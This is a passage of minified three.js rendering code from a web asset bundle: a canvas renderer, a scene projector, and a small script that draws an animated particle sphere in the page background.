THREE.RenderableLine;return o.push(e),a++,ie++,e}function He(){if(ne!==l)return s[ne++];var e=new THREE.RenderableSprite;return s.push(e),l++,ne++,e}function ge(e,t){return e.renderOrder!==t.renderOrder?e.renderOrder-t.renderOrder:e.z!==t.z?t.z-e.z:e.id!==t.id?e.id-t.id:0}function Se(e,t){var i=0,r=1,n=e.z+e.w,o=t.z+t.w,a=-e.z+e.w,s=-t.z+t.w;return 0<=n&&0<=o&&0<=a&&0<=s||!(n<0&&o<0||a<0&&s<0)&&(n<0?i=Math.max(i,n/(n-o)):o<0&&(r=Math.min(r,n/(n-o))),a<0?i=Math.max(i,a/(a-s)):s<0&&(r=Math.min(r,a/(a-s))),!(r<i)&&(e.lerp(t,i),t.lerp(e,1-r),!0))}this.projectScene=function(e,t,i,r){function n(e){(K=function(){if(Q!==se)return ae[Q++];var e=new THREE.RenderableObject;return ae.push(e),se++,Q++,e}()).id=e.id,K.object=e,pe.setFromMatrixPosition(e.matrixWorld),pe.applyMatrix4(he),K.z=pe.z,K.renderOrder=e.renderOrder,ce.objects.push(K)}ne=ie=ee=0,!(ce.elements.length=0)===e.autoUpdate&&e.updateMatrixWorld(),null===t.parent&&t.updateMatrixWorld(),de.copy(t.matrixWorldInverse.getInverse(t.matrixWorld)),he.multiplyMatrices(t.projectionMatrix,de),me.setFromMatrix(he),Q=0,ce.objects.length=0,ce.lights.length=0,e.traverseVisible(function(e){if(e instanceof THREE.Light)ce.lights.push(e);else if(e instanceof THREE.Mesh||e instanceof THREE.Line){if(!1===e.material.visible)return;if(!0===e.frustumCulled&&!1===me.intersectsObject(e))return;n(e)}else if(e instanceof THREE.Sprite){if(!1===e.material.visible)return;if(!0===e.frustumCulled&&!1===me.intersectsSprite(e))return;n(e)}}),!0===i&&ce.objects.sort(ge);for(var o=0,a=ce.objects.length;o<a;o++){var s=ce.objects[o].object,l=s.geometry;if(Re.setObject(s),oe=s.matrixWorld,Z=0,s instanceof THREE.Mesh){if(l instanceof THREE.BufferGeometry){var c=l.attributes,p=l.groups;if(void 0===c.position)continue;for(var E=0,d=(J=c.position.array).length;E<d;E+=3)Re.pushVertex(J[E],J[E+1],J[E+2]);if(void 0!==c.normal){var h=c.normal.array;for(E=0,d=h.length;E<d;E+=3)Re.pushNormal(h[E],h[E+1],h[E+2])}if(void 0!==c.uv){var f=c.uv.array;for(E=0,d=f.length;E<d;E+=2)Re.pushUv(f[E],f[E+1])}if(null!==l.index){var u=l.index.array;if(0<p.length)for(var m=0;m<p.length;m++){var v=p[m];for(E=v.start,d=v.start+v.count;E<d;E+=3)Re.pushTriangle(u[E],u[E+1],u[E+2])}else for(E=0,d=u.length;E<d;E+=3)Re.pushTriangle(u[E],u[E+1],u[E+2])}else for(E=0,d=J.length/3;E<d;E+=3)Re.pushTriangle(E,E+1,E+2)}else if(l instanceof THREE.Geometry){var x=l.vertices,R=l.faces,y=l.faceVertexUvs[0];ue.getNormalMatrix(oe);for(var T=s.material,w=T instanceof THREE.MultiMaterial,H=!0==w?s.material:null,g=0,S=x.length;g<S;g++){var M=x[g];if(pe.copy(M),!0===T.morphTargets)for(var b=l.morphTargets,C=s.morphTargetInfluences,z=0,V=b.length;z<V;z++){var j=C[z];if(0!==j){var L=b[z].vertices[g];pe.x+=(L.x-M.x)*j,pe.y+=(L.y-M.y)*j,pe.z+=(L.z-M.z)*j}}Re.pushVertex(pe.x,pe.y,pe.z)}for(var O=0,B=R.length;O<B;O++){var W=R[O];if(void 0!==(T=!0==w?H.materials[W.materialIndex]:s.material)){var P=T.side,k=le[W.a],N=le[W.b],F=le[W.c];if(!1!==Re.checkTriangleVisibility(k,N,F)){var A=Re.checkBackfaceCulling(k,N,F);if(P!==THREE.DoubleSide){if(P===THREE.FrontSide&&!1===A)continue;if(P===THREE.BackSide&&!0===A)continue}(_=Te()).id=s.id,_.v1.copy(k),_.v2.copy(N),_.v3.copy(F),_.normalModel.copy(W.normal),!1!==A||P!==THREE.BackSide&&P!==THREE.DoubleSide||_.normalModel.negate(),_.normalModel.applyMatrix3(ue).normalize();for(var I=W.vertexNormals,D=0,G=Math.min(I.length,3);D<G;D++){var U=_.vertexNormalsModel[D];U.copy(I[D]),!1!==A||P!==THREE.BackSide&&P!==THREE.DoubleSide||U.negate(),U.applyMatrix3(ue).normalize()}_.vertexNormalsLength=I.length;var q=y[O];if(void 0!==q)for(var X=0;X<3;X++)_.uvs[X].copy(q[X]);_.color=W.color,_.material=T,_.z=(k.positionScreen.z+N.positionScreen.z+F.positionScreen.z)/3,_.renderOrder=s.renderOrder,ce.elements.push(_)}}}}}else if(s instanceof THREE.Line){if(l instanceof THREE.BufferGeometry){if(void 0!==(c=l.attributes).position){var J;for(E=0,d=(J=c.position.array).length;E<d;E+=3)Re.pushVertex(J[E],J[E+1],J[E+2]);if(null!==l.index)for(E=0,d=(u=l.index.array).length;E<d;E+=2)Re.pushLine(u[E],u[E+1]);else{var Y=s instanceof THREE.LineSegments?2:1;for(E=0,d=J.length/3-1;E<d;E+=Y)Re.pushLine(E,E+1)}}}else if(l instanceof THREE.Geometry){if(fe.multiplyMatrices(he,oe),0===(x=s.geometry.vertices).length)continue;(k=ye()).positionScreen.copy(x[0]).applyMatrix4(fe);for(Y=s instanceof THREE.LineSegments?2:1,g=1,S=x.length;g<S;g++)(k=ye()).positionScreen.copy(x[g]).applyMatrix4(fe),0<(g+1)%Y||(N=le[Z-2],ve.copy(k.positionScreen),xe.copy(N.positionScreen),!0===Se(ve,xe)&&(ve.multiplyScalar(1/ve.w),xe.multiplyScalar(1/xe.w),(te=we()).id=s.id,te.v1.positionScreen.copy(ve),te.v2.positionScreen.copy(xe),te.z=Math.max(ve.z,xe.z),te.renderOrder=s.renderOrder,te.material=s.material,s.material.vertexColors===THREE.VertexColors&&(te.vertexColors[0].copy(s.geometry.colors[g]),te.vertexColors[1].copy(s.geometry.colors[g-1])),ce.elements.push(te)))}}else if(s instanceof THREE.Sprite){Ee.set(oe.elements[12],oe.elements[13],oe.elements[14],1),Ee.applyMatrix4(he);var $=1/Ee.w;Ee.z*=$,-1<=Ee.z&&Ee.z<=1&&((re=He()).id=s.id,re.x=Ee.x*$,re.y=Ee.y*$,re.z=Ee.z,re.renderOrder=s.renderOrder,re.object=s,re.rotation=s.rotation,re.scale.x=s.scale.x*Math.abs(re.x-(Ee.x+t.projectionMatrix.elements[0])/(Ee.w+t.projectionMatrix.elements[12])),re.scale.y=s.scale.y*Math.abs(re.y-(Ee.y+t.projectionMatrix.elements[5])/(Ee.w+t.projectionMatrix.elements[13])),re.material=s.material,ce.elements.push(re))}}return!0===r&&ce.elements.sort(ge),ce}};\n(function(){var s,l,c,t=0,i=0,r=window.innerWidth/2,n=window.innerHeight/2;function p(){r=window.innerWidth/2,n=window.innerHeight/2,s.aspect=window.innerWidth/window.innerHeight,s.updateProjectionMatrix(),c.setSize(window.innerWidth,window.innerHeight)}function E(e){t=e.clientX-r,i=e.clientY-n}function d(e){1<e.touches.length&&(t=e.touches[0].pageX-r)}function h(e){1==e.touches.length&&(t=e.touches[0].pageX-r)}function o(){s.position.x+=.05*(t-s.position.x),s.position.y+=.05*(200-i-s.position.y),s.lookAt(l.position),c.render(l,s)}!function(){var e,t;(e=document.createElement(\"div\")).style.position=\"fixed\",e.style.top=\"0px\",e.style.left=\"0px\",e.style.zIndex=\"-1\",e.style.opacity=\"0.5\",document.body.appendChild(e),(s=new THREE.PerspectiveCamera(75,window.innerWidth/window.innerHeight,1,1e4)).position.z=100,l=new THREE.Scene,(c=new THREE.CanvasRenderer({alpha:!0})).setPixelRatio(window.devicePixelRatio),c.setSize(window.innerWidth,window.innerHeight),e.appendChild(c.domElement);for(var i=2*Math.PI,r=new THREE.SpriteCanvasMaterial({color:10263708,program:function(e){e.beginPath(),e.arc(0,0,.5,0,i,!0),e.fill()}}),n=new THREE.Geometry,o=0;o<100;o++)(t=new THREE.Sprite(r)).position.x=2*Math.random()-1,t.position.y=2*Math.random()-1,t.position.z=2*Math.random()-1,t.position.normalize(),t.position.multiplyScalar(10*Math.random()+450),t.scale.x=t.scale.y=10,l.add(t),n.vertices.push(t.position);var a=new THREE.Line(n,new THREE.LineBasicMaterial({color:10263708,opacity:.5}));l.add(a),document.addEventListener(\"mousemove\",E,!1),document.addEventListener(\"touchstart\",d,!1),document.addEventListener(\"touchmove\",h,!1),window.addEventListener(\"resize\",p,!1)}(),function e(){requestAnimationFrame(e);o()}()})();\n"},{"url":"/lib/three/canvas_sphere.min.js","content":"THREE.SpriteCanvasMaterial=function(e){THREE.Material.call(this),this.type=\"SpriteCanvasMaterial\",this.color=new THREE.Color(16777215),this.program=function(e,t){},this.setValues(e)},THREE.SpriteCanvasMaterial.prototype=Object.create(THREE.Material.prototype),THREE.SpriteCanvasMaterial.prototype.constructor=THREE.SpriteCanvasMaterial,THREE.SpriteCanvasMaterial.prototype.clone=function(){var e=new THREE.SpriteCanvasMaterial;return e.copy(this),e.color.copy(this.color),e.program=this.program,e},THREE.CanvasRenderer=function(e){console.log(\"THREE.CanvasRenderer\",THREE.REVISION),e=e||{};var s,l,c,p,E,d,h,f,u,m,v,R,x,y,T,w,H,g,S,M=this,b=new THREE.Projector,i=void 0!==e.canvas?e.canvas:document.createElement(\"canvas\"),C=i.width,z=i.height,V=Math.floor(C/2),j=Math.floor(z/2),L=0,O=0,B=C,W=z,n=1,P=i.getContext(\"2d\",{alpha:!0===e.alpha}),r=new THREE.Color(0),o=!0===e.alpha?0:1,a=1,k=0,N=null,F=null,A=null,I=null,D=null,t=[],G=(new THREE.RenderableVertex,new THREE.RenderableVertex,new THREE.Color),U=(new THREE.Color,new THREE.Color,new THREE.Color,new THREE.Color,new THREE.Color),q=new THREE.Color,X=new THREE.Color,J={},Y=new THREE.Box2,$=new THREE.Box2,K=new THREE.Box2,Q=new THREE.Color,Z=new THREE.Color,_=new THREE.Color,ee=new THREE.Vector3,te=new THREE.Vector3,re=new THREE.Vector3,ie=new THREE.Matrix3;function ne(e,t,r){de(r.opacity),he(r.blending);var i=t.scale.x*V,n=t.scale.y*j,o=.5*Math.sqrt(i*i+n*n);if(K.min.set(e.x-o,e.y-o),K.max.set(e.x+o,e.y+o),r instanceof THREE.SpriteMaterial){var a=r.map;if(null!==a){var s=J[a.id];if(void 0!==s&&s.version===a.version||(s=ce(a),J[a.id]=s),void 0!==s.canvas){Re(s.canvas);var l=a.image,c=l.width*a.offset.x,p=l.height*a.offset.y,E=l.width*a.repeat.x,d=l.height*a.repeat.y,h=i/E,f=n/d;P.save(),P.translate(e.x,e.y),0!==r.rotation&&P.rotate(r.rotation),P.translate(-i/2,-n/2),P.scale(h,f),P.translate(-c,-p),P.fillRect(c,p,E,d),P.restore()}}else Re(r.color.getStyle()),P.save(),P.translate(e.x,e.y),0!==r.rotation&&P.rotate(r.rotation),P.scale(i,-n),P.fillRect(-.5,-.5,1,1),P.restore()}else r instanceof THREE.SpriteCanvasMaterial&&(ve(r.color.getStyle()),Re(r.color.getStyle()),P.save(),P.translate(e.x,e.y),0!==r.rotation&&P.rotate(r.rotation),P.scale(i,n),r.program(P),P.restore())}function oe(e,t,r,i){if(de(i.opacity),he(i.blending),P.beginPath(),P.moveTo(e.positionScreen.x,e.positionScreen.y),P.lineTo(t.positionScreen.x,t.positionScreen.y),i instanceof THREE.LineBasicMaterial){if(fe(i.linewidth),ue(i.linecap),me(i.linejoin),i.vertexColors!==THREE.VertexColors)ve(i.color.getStyle());else{var n=r.vertexColors[0].getStyle(),o=r.vertexColors[1].getStyle();if(n===o)ve(n);else{try{var a=P.createLinearGradient(e.positionScreen.x,e.positionScreen.y,t.positionScreen.x,t.positionScreen.y);a.addColorStop(0,n),a.addColorStop(1,o)}catch(e){a=n}ve(a)}}P.stroke(),K.expandByScalar(2*i.linewidth)}else i instanceof THREE.LineDashedMaterial&&(fe(i.linewidth),ue(i.linecap),me(i.linejoin),ve(i.color.getStyle()),xe([i.dashSize,i.gapSize]),P.stroke(),K.expandByScalar(2*i.linewidth),xe([]))}function ae(e,t,r,i,n,o,a,s){if(M.info.render.vertices+=3,M.info.render.faces++,de(s.opacity),he(s.blending),h=e.positionScreen.x,f=e.positionScreen.y,u=t.positionScreen.x,m=t.positionScreen.y,v=r.positionScreen.x,R=r.positionScreen.y,function(e,t,r,i,n,o){P.beginPath(),P.moveTo(e,t),P.lineTo(r,i),P.lineTo(n,o),P.closePath()}(h,f,u,m,v,R),(s instanceof THREE.MeshLambertMaterial||s instanceof THREE.MeshPhongMaterial)&&null===s.map)U.copy(s.color),q.copy(s.emissive),s.vertexColors===THREE.FaceColors&&U.multiply(a.color),G.copy(Q),te.copy(e.positionWorld).add(t.positionWorld).add(r.positionWorld).divideScalar(3),function(e,t,r){for(var i=0,n=c.length;i<n;i++){var o=c[i];if(X.copy(o.color),o instanceof THREE.DirectionalLight){var a=ee.setFromMatrixPosition(o.matrixWorld).normalize();if((s=t.dot(a))<=0)continue;s*=o.intensity,r.add(X.multiplyScalar(s))}else if(o instanceof THREE.PointLight){var s;a=ee.setFromMatrixPosition(o.matrixWorld);if((s=t.dot(ee.subVectors(a,e).normalize()))<=0)continue;if(0==(s*=0==o.distance?1:1-Math.min(e.distanceTo(a)/o.distance,1)))continue;s*=o.intensity,r.add(X.multiplyScalar(s))}}}(te,a.normalModel,G),G.multiply(U).add(q),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G);else if(s instanceof THREE.MeshBasicMaterial||s instanceof THREE.MeshLambertMaterial||s instanceof THREE.MeshPhongMaterial){if(null!==s.map)s.map.mapping===THREE.UVMapping&&(x=a.uvs,pe(h,f,u,m,v,R,x[i].x,x[i].y,x[n].x,x[n].y,x[o].x,x[o].y,s.map));else null!==s.envMap?s.envMap.mapping===THREE.SphericalReflectionMapping&&(re.copy(a.vertexNormalsModel[i]).applyMatrix3(ie),y=.5*re.x+.5,T=.5*re.y+.5,re.copy(a.vertexNormalsModel[n]).applyMatrix3(ie),w=.5*re.x+.5,H=.5*re.y+.5,re.copy(a.vertexNormalsModel[o]).applyMatrix3(ie),g=.5*re.x+.5,S=.5*re.y+.5,pe(h,f,u,m,v,R,y,T,w,H,g,S,s.envMap)):(G.copy(s.color),s.vertexColors===THREE.FaceColors&&G.multiply(a.color),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G))}else s instanceof THREE.MeshNormalMaterial?(re.copy(a.normalModel).applyMatrix3(ie),G.setRGB(re.x,re.y,re.z).multiplyScalar(.5).addScalar(.5)):G.setRGB(1,1,1),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G)}function se(e,t,r,i){fe(t),ue(r),me(i),ve(e.getStyle()),P.stroke(),K.expandByScalar(2*t)}function le(e){Re(e.getStyle()),P.fill()}function ce(e){if(0===e.version||e instanceof THREE.CompressedTexture||e instanceof THREE.DataTexture)return{canvas:void 0,version:e.version};var t=e.image;if(!1===t.complete)return{canvas:void 0,version:0};var r=e.wrapS===THREE.RepeatWrapping||e.wrapS===THREE.MirroredRepeatWrapping,i=e.wrapT===THREE.RepeatWrapping||e.wrapT===THREE.MirroredRepeatWrapping,n=e.wrapS===THREE.MirroredRepeatWrapping,o=e.wrapT===THREE.MirroredRepeatWrapping,a=document.createElement(\"canvas\");a.width=t.width*(n?2:1),a.height=t.height*(o?2:1);var s=a.getContext(\"2d\");s.setTransform(1,0,0,-1,0,t.height),s.drawImage(t,0,0),!0==n&&(s.setTransform(-1,0,0,-1,t.width,t.height),s.drawImage(t,-t.width,0)),!0==o&&(s.setTransform(1,0,0,1,0,0),s.drawImage(t,0,t.height)),!0==n&&!0==o&&(s.setTransform(-1,0,0,1,t.width,0),s.drawImage(t,-t.width,t.height));var l=\"no-repeat\";!0==r&&!0==i?l=\"repeat\":!0==r?l=\"repeat-x\":!0==i&&(l=\"repeat-y\");var c=P.createPattern(a,l);return e.onUpdate&&e.onUpdate(e),{canvas:c,version:e.version}}function pe(e,t,r,i,n,o,a,s,l,c,p,E,d){var h=J[d.id];if(void 0!==h&&h.version===d.version||(h=ce(d),J[d.id]=h),void 0===h.canvas)return Re(\"rgba( 0, 0, 0, 1)\"),void P.fill();Re(h.canvas);var f,u,m,v,R,x,y,T,w=d.offset.x/d.repeat.x,H=d.offset.y/d.repeat.y,g=d.image.width*d.repeat.x,S=d.image.height*d.repeat.y;l=(l+w)*g,c=(c+H)*S,p=(p+w)*g,E=(E+H)*S,r-=e,i-=t,n-=e,o-=t,0!=(y=(l-=a=(a+w)*g)*(E-=s=(s+H)*S)-(p-=a)*(c-=s))&&(R=e-(f=(E*r-c*n)*(T=1/y))*a-(m=(l*n-p*r)*T)*s,x=t-(u=(E*i-c*o)*T)*a-(v=(l*o-p*i)*T)*s,P.save(),P.transform(f,u,m,v,R,x),P.fill(),P.restore())}function Ee(e,t,r){var i,n=t.x-e.x,o=t.y-e.y,a=n*n+o*o;0!=a&&(n*=i=r/Math.sqrt(a),o*=i,t.x+=n,t.y+=o,e.x-=n,e.y-=o)}function de(e){a!==e&&(P.globalAlpha=e,a=e)}function he(e){k!==e&&(e===THREE.NormalBlending?P.globalCompositeOperation=\"source-over\":e===THREE.AdditiveBlending?P.globalCompositeOperation=\"lighter\":e===THREE.SubtractiveBlending?P.globalCompositeOperation=\"darker\":e===THREE.MultiplyBlending&&(P.globalCompositeOperation=\"multiply\"),k=e)}function fe(e){A!==e&&(P.lineWidth=e,A=e)}function ue(e){I!==e&&(P.lineCap=e,I=e)}function me(e){D!==e&&(P.lineJoin=e,D=e)}function ve(e){N!==e&&(P.strokeStyle=e,N=e)}function Re(e){F!==e&&(P.fillStyle=e,F=e)}function xe(e){t.length!==e.length&&(P.setLineDash(e),t=e)}void 0===P.setLineDash&&(P.setLineDash=function(){}),this.domElement=i,this.autoClear=!0,this.sortObjects=!0,this.sortElements=!0,this.info={render:{vertices:0,faces:0}},this.supportsVertexTextures=function(){},this.setFaceCulling=function(){},this.getContext=function(){return P},this.getContextAttributes=function(){return P.getContextAttributes()},this.getPixelRatio=function(){return n},this.setPixelRatio=function(e){void 0!==e&&(n=e)},this.setSize=function(e,t,r){C=e*n,z=t*n,i.width=C,i.height=z,V=Math.floor(C/2),j=Math.floor(z/2),!1!==r&&(i.style.width=e+\"px\",i.style.height=t+\"px\"),Y.min.set(-V,-j),Y.max.set(V,j),$.min.set(-V,-j),$.max.set(V,j),a=1,k=0,D=I=A=F=N=null,this.setViewport(0,0,e,t)},this.setViewport=function(e,t,r,i){L=e*n,O=t*n,B=r*n,W=i*n},this.setScissor=function(){},this.setScissorTest=function(){},this.setClearColor=function(e,t){r.set(e),o=void 0!==t?t:1,$.min.set(-V,-j),$.max.set(V,j)},this.setClearColorHex=function(e,t){console.warn(\"THREE.CanvasRenderer: .setClearColorHex() is being removed. Use .setClearColor() instead.\"),this.setClearColor(e,t)},this.getClearColor=function(){return r},this.getClearAlpha=function(){return o},this.getMaxAnisotropy=function(){return 0},this.clear=function(){!1===$.isEmpty()&&($.intersect(Y),$.expandByScalar(2),$.min.x=$.min.x+V,$.min.y=-$.min.y+j,$.max.x=$.max.x+V,$.max.y=-$.max.y+j,o<1&&P.clearRect(0|$.min.x,0|$.max.y,$.max.x-$.min.x|0,$.min.y-$.max.y|0),0<o&&(he(THREE.NormalBlending),de(1),Re(\"rgba(\"+Math.floor(255*r.r)+\",\"+Math.floor(255*r.g)+\",\"+Math.floor(255*r.b)+\",\"+o+\")\"),P.fillRect(0|$.min.x,0|$.max.y,$.max.x-$.min.x|0,$.min.y-$.max.y|0)),$.makeEmpty())},this.clearColor=function(){},this.clearDepth=function(){},this.clearStencil=function(){},this.render=function(e,t){if(t instanceof THREE.Camera!=!1){var r=e.background;r&&r.isColor?(Re(\"rgb(\"+Math.floor(255*r.r)+\",\"+Math.floor(255*r.g)+\",\"+Math.floor(255*r.b)+\")\"),P.fillRect(0,0,C,z)):!0===this.autoClear&&this.clear(),M.info.render.vertices=0,M.info.render.faces=0,P.setTransform(B/C,0,0,-W/z,L,z-O),P.translate(V,j),s=b.projectScene(e,t,this.sortObjects,this.sortElements),l=s.elements,c=s.lights,t,ie.getNormalMatrix(t.matrixWorldInverse),function(){Q.setRGB(0,0,0),Z.setRGB(0,0,0),_.setRGB(0,0,0);for(var e=0,t=c.length;e<t;e++){var r=c[e],i=r.color;r instanceof THREE.AmbientLight?Q.add(i):r instanceof THREE.DirectionalLight?Z.add(i):r instanceof THREE.PointLight&&_.add(i)}}();for(var i=0,n=l.length;i<n;i++){var o=l[i],a=o.material;if(void 0!==a&&0!==a.opacity){if(K.makeEmpty(),o instanceof THREE.RenderableSprite)(p=o).x*=V,p.y*=j,ne(p,o,a);else if(o instanceof THREE.RenderableLine)p=o.v1,E=o.v2,p.positionScreen.x*=V,p.positionScreen.y*=j,E.positionScreen.x*=V,E.positionScreen.y*=j,K.setFromPoints([p.positionScreen,E.positionScreen]),!0===Y.intersectsBox(K)&&oe(p,E,o,a);else if(o instanceof THREE.RenderableFace){if(p=o.v1,E=o.v2,d=o.v3,p.positionScreen.z<-1||1<p.positionScreen.z)continue;if(E.positionScreen.z<-1||1<E.positionScreen.z)continue;if(d.positionScreen.z<-1||1<d.positionScreen.z)continue;p.positionScreen.x*=V,p.positionScreen.y*=j,E.positionScreen.x*=V,E.positionScreen.y*=j,d.positionScreen.x*=V,d.positionScreen.y*=j,0<a.overdraw&&(Ee(p.positionScreen,E.positionScreen,a.overdraw),Ee(E.positionScreen,d.positionScreen,a.overdraw),Ee(d.positionScreen,p.positionScreen,a.overdraw)),K.setFromPoints([p.positionScreen,E.positionScreen,d.positionScreen]),!0===Y.intersectsBox(K)&&ae(p,E,d,0,1,2,o,a)}$.union(K)}}P.setTransform(1,0,0,1,0,0)}else console.error(\"THREE.CanvasRenderer.render: camera is not an instance of THREE.Camera.\")}},THREE.RenderableObject=function(){this.id=0,this.object=null,this.z=0,this.renderOrder=0},THREE.RenderableFace=function(){this.id=0,this.v1=new THREE.RenderableVertex,this.v2=new THREE.RenderableVertex,this.v3=new THREE.RenderableVertex,this.normalModel=new THREE.Vector3,this.vertexNormalsModel=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3],this.vertexNormalsLength=0,this.color=new THREE.Color,this.material=null,this.uvs=[new THREE.Vector2,new THREE.Vector2,new THREE.Vector2],this.z=0,this.renderOrder=0},THREE.RenderableVertex=function(){this.position=new THREE.Vector3,this.positionWorld=new THREE.Vector3,this.positionScreen=new THREE.Vector4,this.visible=!0},THREE.RenderableVertex.prototype.copy=function(e){this.positionWorld.copy(e.positionWorld),this.positionScreen.copy(e.positionScreen)},THREE.RenderableLine=function(){this.id=0,this.v1=new THREE.RenderableVertex,this.v2=new THREE.RenderableVertex,this.vertexColors=[new THREE.Color,new THREE.Color],this.material=null,this.z=0,this.renderOrder=0},THREE.RenderableSprite=function(){this.id=0,this.object=null,this.x=0,this.y=0,this.z=0,this.rotation=0,this.scale=new THREE.Vector2,this.material=null,this.renderOrder=0},THREE.Projector=function(){var K,Q,n,Z,_,ee,te,re,ie,ne,oe,ae=[],se=0,le=[],t=0,r=[],i=0,o=[],a=0,s=[],l=0,ce={objects:[],lights:[],elements:[]},pe=new THREE.Vector3,Ee=new THREE.Vector4,u=new THREE.Box3(new THREE.Vector3(-1,-1,-1),new THREE.Vector3(1,1,1)),m=new THREE.Box3,v=new Array(3),de=(new Array(4),new THREE.Matrix4),he=new THREE.Matrix4,fe=new THREE.Matrix4,ue=new THREE.Matrix3,me=new THREE.Frustum,ve=new THREE.Vector4,Re=new THREE.Vector4;this.projectVector=function(e,t){console.warn(\"THREE.Projector: .projectVector() is now vector.project().\"),e.project(t)},this.unprojectVector=function(e,t){console.warn(\"THREE.Projector: .unprojectVector() is now vector.unproject().\"),e.unproject(t)},this.pickingRay=function(e,t){console.error(\"THREE.Projector: .pickingRay() is now raycaster.setFromCamera().\")};var xe=new function(){var l=[],c=[],p=null,E=null,d=new THREE.Matrix3;function i(e){var t=e.position,r=e.positionWorld,i=e.positionScreen;r.copy(t).applyMatrix4(oe),i.copy(r).applyMatrix4(he);var n=1/i.w;i.x*=n,i.y*=n,i.z*=n,e.visible=-1<=i.x&&i.x<=1&&-1<=i.y&&i.y<=1&&-1<=i.z&&i.z<=1}function h(e,t,r){return!0===e.visible||!0===t.visible||!0===r.visible||(v[0]=e.positionScreen,v[1]=t.positionScreen,v[2]=r.positionScreen,u.intersectsBox(m.setFromPoints(v)))}function f(e,t,r){return(r.positionScreen.x-e.positionScreen.x)*(t.positionScreen.y-e.positionScreen.y)-(r.positionScreen.y-e.positionScreen.y)*(t.positionScreen.x-e.positionScreen.x)<0}return{setObject:function(e){E=(p=e).material,d.getNormalMatrix(p.matrixWorld),l.length=0,c.length=0},projectVertex:i,checkTriangleVisibility:h,checkBackfaceCulling:f,pushVertex:function(e,t,r){(n=ye()).position.set(e,t,r),i(n)},pushNormal:function(e,t,r){l.push(e,t,r)},pushUv:function(e,t){c.push(e,t)},pushLine:function(e,t){var r=le[e],i=le[t];(te=we()).id=p.id,te.v1.copy(r),te.v2.copy(i),te.z=(r.positionScreen.z+i.positionScreen.z)/2,te.renderOrder=p.renderOrder,te.material=p.material,ce.elements.push(te)},pushTriangle:function(e,t,r){var i=le[e],n=le[t],o=le[r];if(!1!==h(i,n,o)&&(E.side===THREE.DoubleSide||!0===f(i,n,o))){(_=Te()).id=p.id,_.v1.copy(i),_.v2.copy(n),_.v3.copy(o),_.z=(i.positionScreen.z+n.positionScreen.z+o.positionScreen.z)/3,_.renderOrder=p.renderOrder,_.normalModel.fromArray(l,3*e),_.normalModel.applyMatrix3(d).normalize();for(var a=0;a<3;a++){var s=_.vertexNormalsModel[a];s.fromArray(l,3*arguments[a]),s.applyMatrix3(d).normalize(),_.uvs[a].fromArray(c,2*arguments[a])}_.vertexNormalsLength=3,_.material=p.material,ce.elements.push(_)}}}};function ye(){if(Z!==t)return le[Z++];var e=new THREE.RenderableVertex;return le.push(e),t++,Z++,e}function Te(){if(ee!==i)return r[ee++];var e=new THREE.RenderableFace;return r.push(e),i++,ee++,e}function we(){if(re!==a)return o[re++];var e=new THREE.RenderableLine;return o.push(e),a++,re++,e}function He(){if(ne!==l)return s[ne++];var e=new THREE.RenderableSprite;return s.push(e),l++,ne++,e}function ge(e,t){return e.renderOrder!==t.renderOrder?e.renderOrder-t.renderOrder:e.z!==t.z?t.z-e.z:e.id!==t.id?e.id-t.id:0}function Se(e,t){var r=0,i=1,n=e.z+e.w,o=t.z+t.w,a=-e.z+e.w,s=-t.z+t.w;return 0<=n&&0<=o&&0<=a&&0<=s||!(n<0&&o<0||a<0&&s<0)&&(n<0?r=Math.max(r,n/(n-o)):o<0&&(i=Math.min(i,n/(n-o))),a<0?r=Math.max(r,a/(a-s)):s<0&&(i=Math.min(i,a/(a-s))),!(i<r)&&(e.lerp(t,r),t.lerp(e,1-i),!0))}this.projectScene=function(e,t,r,i){function n(e){(K=function(){if(Q!==se)return ae[Q++];var e=new THREE.RenderableObject;return ae.push(e),se++,Q++,e}()).id=e.id,K.object=e,pe.setFromMatrixPosition(e.matrixWorld),pe.applyMatrix4(he),K.z=pe.z,K.renderOrder=e.renderOrder,ce.objects.push(K)}ne=re=ee=0,!(ce.elements.length=0)===e.autoUpdate&&e.updateMatrixWorld(),null===t.parent&&t.updateMatrixWorld(),de.copy(t.matrixWorldInverse.getInverse(t.matrixWorld)),he.multiplyMatrices(t.projectionMatrix,de),me.setFromMatrix(he),Q=0,ce.objects.length=0,ce.lights.length=0,e.traverseVisible(function(e){if(e instanceof THREE.Light)ce.lights.push(e);else if(e instanceof THREE.Mesh||e instanceof THREE.Line){if(!1===e.material.visible)return;if(!0===e.frustumCulled&&!1===me.intersectsObject(e))return;n(e)}else if(e instanceof THREE.Sprite){if(!1===e.material.visible)return;if(!0===e.frustumCulled&&!1===me.intersectsSprite(e))return;n(e)}}),!0===r&&ce.objects.sort(ge);for(var o=0,a=ce.objects.length;o<a;o++){var s=ce.objects[o].object,l=s.geometry;if(xe.setObject(s),oe=s.matrixWorld,Z=0,s instanceof THREE.Mesh){if(l instanceof THREE.BufferGeometry){var c=l.attributes,p=l.groups;if(void 0===c.position)continue;for(var E=0,d=(J=c.position.array).length;E<d;E+=3)xe.pushVertex(J[E],J[E+1],J[E+2]);if(void 0!==c.normal){var h=c.normal.array;for(E=0,d=h.length;E<d;E+=3)xe.pushNormal(h[E],h[E+1],h[E+2])}if(void 0!==c.uv){var f=c.uv.array;for(E=0,d=f.length;E<d;E+=2)xe.pushUv(f[E],f[E+1])}if(null!==l.index){var u=l.index.array;if(0<p.length)for(var m=0;m<p.length;m++){var v=p[m];for(E=v.start,d=v.start+v.count;E<d;E+=3)xe.pushTriangle(u[E],u[E+1],u[E+2])}else for(E=0,d=u.length;E<d;E+=3)xe.pushTriangle(u[E],u[E+1],u[E+2])}else for(E=0,d=J.length/3;E<d;E+=3)xe.pushTriangle(E,E+1,E+2)}else if(l instanceof THREE.Geometry){var R=l.vertices,x=l.faces,y=l.faceVertexUvs[0];ue.getNormalMatrix(oe);for(var T=s.material,w=T instanceof THREE.MultiMaterial,H=!0==w?s.material:null,g=0,S=R.length;g<S;g++){var M=R[g];if(pe.copy(M),!0===T.morphTargets)for(var b=l.morphTargets,C=s.morphTargetInfluences,z=0,V=b.length;z<V;z++){var j=C[z];if(0!==j){var L=b[z].vertices[g];pe.x+=(L.x-M.x)*j,pe.y+=(L.y-M.y)*j,pe.z+=(L.z-M.z)*j}}xe.pushVertex(pe.x,pe.y,pe.z)}for(var O=0,B=x.length;O<B;O++){var 